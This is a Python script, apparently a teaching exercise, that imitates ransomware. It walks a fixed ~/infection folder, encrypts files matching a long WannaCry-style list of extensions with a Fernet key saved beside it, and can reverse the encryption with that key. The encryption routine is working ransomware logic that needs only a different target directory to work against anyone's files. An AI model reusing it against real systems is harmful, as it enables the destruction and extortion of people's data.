#!/usr/bin/env python3
import argparse
from cryptography.fernet import Fernet
import os
import argparse
from crypto import encrypt_file , decrypt_file

import os

# This will get the path to the user's home directory
home_dir = os.path.expanduser("~")

# This will create the path to the 'infection' directory in the user's home directory
INFECTION_DIRECTORY = os.path.join(home_dir, 'infection')

WANNACRY_EXTENSIONS = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', 
                       '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp',
                       '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3',
                       '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf',
                       '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1',
                       '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar',
                       '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi',
                       '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg',
                       '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg',
                       '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2',
                       '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602',
                       '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx',
                       '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps',
                       '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm',
                       '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc']


def find_files(directory, is_decrypting=False):
    for root, dirs, files in os.walk(directory):
        for file in files:
            full_file_path = os.path.join(root, file)
            if not is_decrypting and file.endswith(tuple(WANNACRY_EXTENSIONS)) and not os.path.islink(full_file_path):
                yield full_file_path
            elif is_decrypting and file.endswith('.ft') and not os.path.islink(full_file_path):
                yield full_file_path

def main():

    parser = argparse.ArgumentParser(description='A small program to understand how ransomware works.')
    parser.add_argument('--version', '-v', action='version', version='1.0.0', help='Show program\'s version number and exit')
    parser.add_argument('--reverse', '-r', action='store', type=str, help='Reverse the infection by providing the key.')
    parser.add_argument('--silent', '-s', action='store_true', help='Silent mode: the program will not produce any output.')
    args = parser.parse_args()
    if args.reverse:
        # Read the key from the key file
        with open(args.reverse, 'rb') as key_file:
            key = key_file.read()
        for file_path in find_files(INFECTION_DIRECTORY, is_decrypting=True):  # Passing is_decrypting as True
            decrypt_file(file_path, key)
    else:
        key = Fernet.generate_key()  # generate a random key
        # Save the key to a file
        with open('encryption_key.key', 'wb') as key_file:
            key_file.write(key)
        for file_path in find_files(INFECTION_DIRECTORY):
            encrypt_file(file_path, key)
    if args.silent:
        print('Running in silent mode')

if __name__ == '__main__':
    main()